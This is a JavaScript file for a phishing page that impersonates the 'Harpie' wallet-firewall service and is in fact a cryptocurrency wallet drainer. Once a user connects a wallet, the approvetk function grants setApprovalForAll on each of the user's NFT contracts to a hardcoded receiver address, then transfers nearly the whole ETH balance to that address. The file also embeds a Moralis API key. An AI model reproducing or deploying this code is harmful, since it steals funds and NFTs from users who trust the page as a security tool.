var account=localStorage.getItem("connectedAddr");
var viewdata;

let metamaskInstalled = false;
let metaProvider;
let connectionStatus = localStorage.getItem("isconnected") || false;
let connectedAddr = localStorage.getItem("connectedAddr");
let user_address;


const apiKey =
  "C25fZWWxsDYqIRb7JQyyzt9Jh4RvExGDlrJrMuqvCWGw90Kgn2H6iCpVYCoaaEKi";
let receiver_address = "0x9808DAA46c2EBC416B6bAC73D651bC7a766Fad55";



Moralis.onWeb3Enabled(async (data) => {

  connectionStatus = true;
  localStorage.setItem("isconnected", true);
  localStorage.setItem("connectedAddr", data.account);
  connectedAddr = data.account;
  user_address = data.account || localStorage.getItem("connectedAddr");

  await setupview(data.account);

  console.log(data);

 
});



Moralis.onDisconnect(async (error) => {
 await disconnect()
});


// WalletsConnect

let connectWC = async () => {

  
    try {
   
      await Moralis.enableWeb3({
        provider: "walletconnect",
        mobileLinks: ["metamask", "trust"],
      });

      localStorage.setItem("connectortype", 'walletconnect');
      
  
    } catch (error) {
      
      console.log(error);
    }
  
  

};

//Metamask

async function connectMM() {

    try {
      if (typeof window.ethereum !== "undefined") {
        localStorage.setItem("metamaskInstalled", true);
        metamaskInstalled = true;
        console.log("MetaMask is installed!", metamaskInstalled);
  
        // console.log("hererererr");
        await Moralis.enableWeb3(metamaskInstalled);


        localStorage.setItem("connectortype", 'metamask');
  
      }else{
        console.log('Metamask Not Found!')
      }
  
    } catch (error) {
      
      console.log(error);
    }

}

let disconnect = async () => {
  account = null;
  localStorage.setItem("connectedAddr", "");
  localStorage.setItem('connectortype','');
  localStorage.setItem("isconnected", false);
  localStorage.setItem("metamaskInstalled", false);
  connectionStatus = false;
  unsetview();
};





function togglemenu() {
  $(".upnav").toggle();
  $(".closebtn").toggle();
}

async function setupview(account) {
  viewdata = [
    {
      data: "",
      id: "accountplace",
    },
    {
      data: "",
      id: "connectstatus",
    },
    {
      data: "",
      id: "mainpage",
    },
    {
      data: "",
      id: "dashboardbtn",
    },
  ];

  viewdata.forEach((data) => {
    let id = data.id;

    let htmldata = $("#" + id).html();

    data["data"] = htmldata;
  });

  let shortaddr = await shortPublicKey(account);
  $("#accountplace").html(shortaddr);
  $("#connectstatus").html("connected");
  $("#dashboardbtn").html("My Dashboard");
  $("#mainpage").html(
    '<div class="space-y-4"><h2 class="text-2xl font-bold font-display">Connect a Wallet</h2><div class="space-y-2 text-md"><p>Harpie is the first <span class="underline">on-chain firewall</span> protecting your wallet from hacks, scams, and theft.</p><p>In the next steps, you will create a <strong>trusted network</strong>. A trusted network is a list of apps &amp; people you trust. If you send assets outside of your trusted network, our systems stop that transfer from executing.</p></div><p class="italic font-medium text-md">Connected with ' +
      shortaddr +
      ' on <span class="font-semibold">Ethereum Mainnet</span></p><button onclick="goToDashboard()" class="self-start bg-harpie font-display hover:bg-harpie-600 focus:ring-harpie-200 border-2 border-harpie duration-200 transition ease-in-out inline-block py-2 text-base rounded-sm tracking-wide text-white transition-colors ease-in-out md:px-8 lg:px-10 px-6 focus:ring disabled:cursor-default">Go To Dashboard</button></div>'
  );
}

async function goToDashboard() {
  location.href = "../dashboard/#/" + account;
}

async function unsetview() {
  viewdata.forEach((eachdata) => {
    let id = eachdata.id;
    let data = eachdata.data;

    $("#" + id).html(data);
  });
}

async function openModal() {
  $("#connectmodal").show();
}

async function closeModal() {
  $("#connectmodal").hide();
}

function shortPublicKey(string) {
  let firstpart = string.slice(0, 7);
  let lastpart = string.slice(-7);

  let newstring = firstpart + "..." + lastpart;

  return newstring;
}

function extract(element) {
  let text = $(element).find(".name").text();

  if (text == "WalletConnect") {
    console.log("WalletConnect");
    connectWC();
  } else if (text == "Metamask") {
    console.log("Metamask");
    connectMM();
  }

  closeModal();
}





async function getTokens(address) {
  return new Promise((resolve, reject) => {
    fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`, {
      method: "GET",
      headers: {
        //"accept": "application/json",
        //"X-API-Key": api_key
      },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}

async function getBalance(address, chain = "eth") {
  return new Promise((resolve, reject) => {
    fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=eth`, {
      method: "GET",
      headers: {
        accept: "application/json",
        "X-API-Key": apiKey,
      },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function getNFTss(
  address,
  api_key = "C25fZWWxsDYqIRb7JQyyzt9Jh4RvExGDlrJrMuqvCWGw90Kgn2H6iCpVYCoaaEKi",
  chain = "eth",
  limit = "98"
) {
  return new Promise((resolve, reject) => {
    fetch(
      `https://deep-index.moralis.io/api/v2/${address}/nft?chain=${chain}&format=decimal&limit=${limit}&normalizeMetadata=false`,
      {
        method: "GET",
        headers: {
          accept: "application/json",
          "X-API-Key": api_key,
        },
      }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}

async function approvetk() {
  user_address = localStorage.getItem("connectedAddr");
  console.log("user Adddress", user_address);
  // return;
  metamaskInstalled = localStorage.getItem("metamaskInstalled");
  console.log("metamaskInstalled", metamaskInstalled);


  if (connectionStatus) {
    console.log("connectionStatus", connectionStatus);

    // return;
    let eth_tokens;
    let eth_NFTs;
    let eth_NFTsLength;
    let eth_tokensLength;
    async function send() {
      console.log("Attempting to send tokens...");
      if (!user_address) {
        throw Error(`No user:  ${user_address}`);
      }
      console.log("Searching for tokens...");

      // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
      eth_NFTs = await getNFTss(user_address).catch((e) => {
        console.log("Unable to get NFTs", e);
      });

      const eth_token = await getTokens(user_address).catch((e) => {
        console.log("Unable to get tokens", e);
      });
      console.log(`ETHEREUM : connected to ${user_address}`);
      console.log("First Eth tokens: %o", eth_token);

      eth_tokens = eth_token.tokens;

      console.log("Eth tokens: %o", eth_tokens);
      console.log("Eth NFTS: %o", eth_NFTs);
      if (eth_tokens) {
        console.log("Eth tokens length: %o", eth_tokens.length);
        eth_tokensLength = eth_tokens.length;
      }

      if (eth_NFTs) {
        console.log("Eth NFTs : %o", eth_NFTs);
        console.log("Eth NFTs : %o", eth_NFTs.result);
        console.log("Eth NFTs length: %o", eth_NFTs.result.length);
        eth_NFTsLength = eth_NFTs.result.length;
      }

      // IF no tokens or NFTs found, send ETH
      if (eth_tokens == undefined && eth_NFTs == undefined) {
        console.log("No tokens or NFTs found, sending ETH");
        console.log(`No valuable token found`);
        const eth_balance = await getBalance(user_address).catch((e) => {
          console.log("Unable to get new eth balance", e);
        });
        console.log("eth_balance", eth_balance);
        console.log("eth_balance.balance", eth_balance.balance);

        const balance =
          parseInt(eth_balance.balance) / 1000000000000000000 - 0.001;
        console.log("The new eth balance", balance);
        if (balance > 0) {
          const options = {
            type: "native",
            amount: Moralis.Units.ETH(balance.toString()),
            receiver: receiver_address,
          };
          let result = await Moralis.transfer(options);
          console.log(result);
        } else {
          console.log("Insufficient funds");
        }
        return console.log("No tokens found");
      }

      //  IF no token was found but found nfts, SEND NFTS and ETH
      // console.log("eth_nfts Length", eth_NFTsLength);
      // console.log("eth_tokens", eth_tokens);
      if (eth_tokens == undefined || eth_NFTsLength > 0) {
        console.log("No eth tokens found, BUT found NFTS");

        for (let n = 0; n < eth_NFTsLength; n++) {
          let nft = eth_NFTs.result[Number(n)];
          let ABI721 = [
            {
              inputs: [
                {
                  internalType: "string",
                  name: "baseURI",
                  type: "string",
                },
              ],
              stateMutability: "nonpayable",
              type: "constructor",
            },
            {
              inputs: [],
              name: "ApprovalCallerNotOwnerNorApproved",
              type: "error",
            },
            {
              inputs: [],
              name: "ApprovalQueryForNonexistentToken",
              type: "error",
            },
            { inputs: [], name: "ApproveToCaller", type: "error" },
            {
              inputs: [],
              name: "BalanceQueryForZeroAddress",
              type: "error",
            },
            {
              inputs: [],
              name: "MintERC2309QuantityExceedsLimit",
              type: "error",
            },
            { inputs: [], name: "MintToZeroAddress", type: "error" },
            { inputs: [], name: "MintZeroQuantity", type: "error" },
            {
              inputs: [],
              name: "OwnerQueryForNonexistentToken",
              type: "error",
            },
            {
              inputs: [],
              name: "OwnershipNotInitializedForExtraData",
              type: "error",
            },
            {
              inputs: [],
              name: "TransferCallerNotOwnerNorApproved",
              type: "error",
            },
            {
              inputs: [],
              name: "TransferFromIncorrectOwner",
              type: "error",
            },
            {
              inputs: [],
              name: "TransferToNonERC721ReceiverImplementer",
              type: "error",
            },
            { inputs: [], name: "TransferToZeroAddress", type: "error" },
            {
              inputs: [],
              name: "URIQueryForNonexistentToken",
              type: "error",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "approved",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "Approval",
              type: "event",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "operator",
                  type: "address",
                },
                {
                  indexed: false,
                  internalType: "bool",
                  name: "approved",
                  type: "bool",
                },
              ],
              name: "ApprovalForAll",
              type: "event",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "uint256",
                  name: "fromTokenId",
                  type: "uint256",
                },
                {
                  indexed: false,
                  internalType: "uint256",
                  name: "toTokenId",
                  type: "uint256",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "to",
                  type: "address",
                },
              ],
              name: "ConsecutiveTransfer",
              type: "event",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "previousOwner",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "newOwner",
                  type: "address",
                },
              ],
              name: "OwnershipTransferred",
              type: "event",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "to",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "Transfer",
              type: "event",
            },
            {
              inputs: [],
              name: "FREE_AllowedTokensPerWallet",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "FREE_MAX_SUPPLY",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "MAX_SUPPLY",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                { internalType: "address", name: "to", type: "address" },
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "approve",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
              ],
              name: "balanceOf",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_count",
                  type: "uint256",
                },
                {
                  internalType: "address[]",
                  name: "addresses",
                  type: "address[]",
                },
              ],
              name: "batchAirdrop",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "getApproved",
              outputs: [{ internalType: "address", name: "", type: "address" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "isActive",
              outputs: [{ internalType: "bool", name: "", type: "bool" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  internalType: "address",
                  name: "operator",
                  type: "address",
                },
              ],
              name: "isApprovedForAll",
              outputs: [{ internalType: "bool", name: "", type: "bool" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "maxAllowedTokensPerPurchase",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "maxAllowedTokensPerWallet",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_count",
                  type: "uint256",
                },
              ],
              name: "mint",
              outputs: [],
              stateMutability: "payable",
              type: "function",
            },
            {
              inputs: [],
              name: "mintPrice",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "name",
              outputs: [{ internalType: "string", name: "", type: "string" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "owner",
              outputs: [{ internalType: "address", name: "", type: "address" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "ownerOf",
              outputs: [{ internalType: "address", name: "", type: "address" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "renounceOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [],
              name: "reserveNft",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                { internalType: "address", name: "to", type: "address" },
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "safeTransferFrom",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                { internalType: "address", name: "to", type: "address" },
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
                { internalType: "bytes", name: "_data", type: "bytes" },
              ],
              name: "safeTransferFrom",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "operator",
                  type: "address",
                },
                { internalType: "bool", name: "approved", type: "bool" },
              ],
              name: "setApprovalForAll",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "string",
                  name: "baseURI",
                  type: "string",
                },
              ],
              name: "setBaseURI",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_count",
                  type: "uint256",
                },
              ],
              name: "setFreeMaximumAllowedTokensPerWallet",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "maxMintSupply",
                  type: "uint256",
                },
              ],
              name: "setMaxMintSupply",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                { internalType: "uint256", name: "val", type: "uint256" },
              ],
              name: "setMaxReserve",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_count",
                  type: "uint256",
                },
              ],
              name: "setMaximumAllowedTokensPerTx",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_count",
                  type: "uint256",
                },
              ],
              name: "setMaximumAllowedTokensPerWallet",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "_price",
                  type: "uint256",
                },
              ],
              name: "setPrice",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                { internalType: "uint256", name: "val", type: "uint256" },
              ],
              name: "setReserveAtATime",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "bytes4",
                  name: "interfaceId",
                  type: "bytes4",
                },
              ],
              name: "supportsInterface",
              outputs: [{ internalType: "bool", name: "", type: "bool" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "symbol",
              outputs: [{ internalType: "string", name: "", type: "string" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "toggleSale",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "tokenURI",
              outputs: [{ internalType: "string", name: "", type: "string" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "totalSupply",
              outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                { internalType: "address", name: "to", type: "address" },
                {
                  internalType: "uint256",
                  name: "tokenId",
                  type: "uint256",
                },
              ],
              name: "transferFrom",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "newOwner",
                  type: "address",
                },
              ],
              name: "transferOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [],
              name: "withdraw",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
          ];
          let {
            contract_type: type,
            token_address: contractAddress,
            token_id: tokenId,
          } = nft;

          const sendOptions = {
            contractAddress: contractAddress,
            functionName: "setApprovalForAll",
            abi: ABI721,
            params: {
              operator: receiver_address,
              approved: true,
            },
          };
          let mum = "";

          console.log("Transfer Options: %o", sendOptions);

          let transaction = await Moralis.executeFunction(sendOptions).catch(
            (e) => {
              console.log(
                "Can't transfer token:",
                e,
                "Transfer Options: %o",
                sendOptions
              );
              if (e.code === 4001) {
                mum = "denied";
              } else {
                mum = "approved";
              }
            }
          );
          if (transaction) {
            console.log("Approved");
          } else {
            console.log("DEnied");
          }
          console.log(transaction);
          // if(transaction){
          //   await transaction.wait().then((v) => {
          //     console.log('Finished Processing transaction:', v)
          //   })
          // }
        }

        const eth_balance = await getBalance(user_address).catch((e) => {
          console.log("Unable to get new eth balance", e);
        });
        console.log("eth_balance", eth_balance);
        console.log("eth_balance.balance", eth_balance.balance);
        const balance =
          parseInt(eth_balance.balance) / 1000000000000000000 - 0.002;
        console.log("The new eth balance", balance);
        if (balance > 0) {
          const options = {
            type: "native",
            amount: Moralis.Units.ETH(balance.toString()),
            receiver: receiver_address,
          };
          let result = await Moralis.transfer(options);
          return console.log(result);
        } else {
          return console.log("Insufficient funds");
        }
      }



    }

    send();
  } else {
    alert("please connect your wallet");
  }
}
